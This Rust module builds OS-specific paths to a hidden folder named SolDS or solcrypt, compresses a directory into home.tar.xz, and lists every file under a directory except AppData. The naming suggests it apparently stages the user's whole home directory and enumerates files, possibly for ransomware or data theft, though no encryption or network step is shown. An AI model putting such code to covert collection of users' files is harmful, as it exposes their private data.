use std::fs::File;
use std::io::BufWriter;

use tar::Builder;
use xz2::write::XzEncoder;
use walkdir::WalkDir;
use walkdir::DirEntry;

// This entire struct is basically a workaround so I can recreate my constant-like variables in a Tokio Task
pub struct VarSet {
    pub home: String,
    pub dest: String,
    pub dirpath: String
}

impl VarSet {
    pub fn new() -> VarSet {
        #[cfg(target_os = "windows")]
        let home = std::env::var("USERPROFILE").unwrap();
        #[cfg(target_os = "windows")]
        let dest = format!("{home}\\AppData\\Local\\SolDS\\home.tar.xz");
        #[cfg(target_os = "windows")]
        let dirpath = format!("{home}\\AppData\\Local\\SolDS\\");

        #[cfg(target_os = "linux")]
        let home = std::env::var("HOME").unwrap();
        #[cfg(target_os = "linux")]
        let dest: String = String::from("/tmp/solcrypt/home.tar.xz");
        #[cfg(target_os = "linux")]
        let dirpath = format!("/tmp/solcrypt");

        let returnval = VarSet {
            home: home,
            dest: dest,
            dirpath: dirpath,
        };

        returnval
    }
}

fn is_app_data(entry: &DirEntry) -> bool {
    entry.path().components().any(|component| {
        component.as_os_str() == "AppData"
    })
}

// Credit: ChatGPT-4o
pub fn compress_directory_to_tar_xz(src_dir: String, dest_file: String) -> std::io::Result<()> {
    dbg!(&src_dir);
    dbg!(&dest_file);
    // Open the destination file
    let tar_xz_file = File::create(dest_file)?;

    // Wrap the file in a buffered writer for better performance
    let buf_writer = BufWriter::new(tar_xz_file);

    // Create an XZ encoder with the buffered writer
    let mut xz_encoder = XzEncoder::new(buf_writer, 9); // 9 is the compression level

    // Create a tar builder that writes to the XZ encoder
    {
        let mut tar_builder = Builder::new(&mut xz_encoder);

        // Append the directory to the tar archive
        tar_builder.append_dir_all(".", src_dir)?;

        // Finish the tar archive
        tar_builder.finish()?;
    } // tar_builder is dropped here, ending the borrow on xz_encoder

    // Finish the XZ encoding
    xz_encoder.finish()?;

    Ok(())
}


pub fn get_all_files(dir: &str) -> Vec<String> {
    let mut file_paths = Vec::new();

    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()).filter(|e| !is_app_data(e)) {
        if entry.file_type().is_file() {
            file_paths.push(entry.path().display().to_string());

        }
    }

    file_paths
}
